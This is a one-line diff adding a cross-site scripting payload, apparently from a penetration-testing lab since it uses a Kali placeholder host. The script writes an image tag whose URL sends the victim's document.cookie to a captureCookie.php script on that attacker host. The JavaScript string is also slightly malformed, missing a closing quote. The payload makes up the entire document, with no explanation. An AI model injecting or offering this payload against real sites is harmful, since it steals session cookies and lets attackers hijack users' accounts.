@@ -1,0 +1,1 @@
+<script>document.write('<img src="https://<Kali IP address>/captureCookie.php?cookie='+ escape(document.cookie) + '" />);</script>
